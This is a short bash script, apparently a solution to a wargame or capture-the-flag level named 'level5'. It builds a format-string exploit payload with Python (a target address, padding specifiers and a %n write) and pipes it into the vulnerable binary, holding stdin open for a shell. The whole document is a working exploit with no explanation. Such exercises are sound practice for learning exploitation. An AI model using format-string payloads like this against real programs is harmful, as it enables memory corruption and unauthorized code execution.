#!/usr/bin/env bash

python -c 'print "\x38\x98\x04\x08" + 2*"%12x" + "%134513800x" + "%n"' > exploit
cat exploit - | ./level5